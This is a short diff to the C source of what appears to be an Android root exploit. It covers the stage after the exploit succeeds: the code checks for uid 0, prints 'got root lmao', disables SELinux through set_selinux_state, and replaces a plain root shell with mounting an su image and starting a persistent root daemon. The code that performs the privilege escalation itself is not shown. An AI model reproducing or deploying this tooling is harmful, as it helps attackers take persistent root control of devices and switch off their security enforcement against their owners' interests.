@@ -14,6 +14,7 @@
 #include "sidtab.h"
 #include "policydb.h"
 #include "offsets.h"
+#include "start_daemon.h"
 
 #define UDP_SERVER_PORT (5105)
 #define MEMMAGIC (0xDEADBEEF)
@@ -416,7 +417,11 @@ int main(int argc, char* argv[])
 	
 	if(getuid() == 0)
 	{
+		printf("\n");
 		printf("got root lmao\n");
+		printf("\n");
+
+		printf("[+] Run root command\n");
 
 		get_selinux_state(o);
 
@@ -424,7 +429,10 @@ int main(int argc, char* argv[])
 		set_selinux_state(o, 0, 0);
 
 		if(argc <= 1)
-			system("USER=root /system/bin/sh");
+		{
+			if (mount_su_image() || start_daemon())
+				ret = 1;
+		}
 		else
 		{
 			char cmd[128] = { 0 };
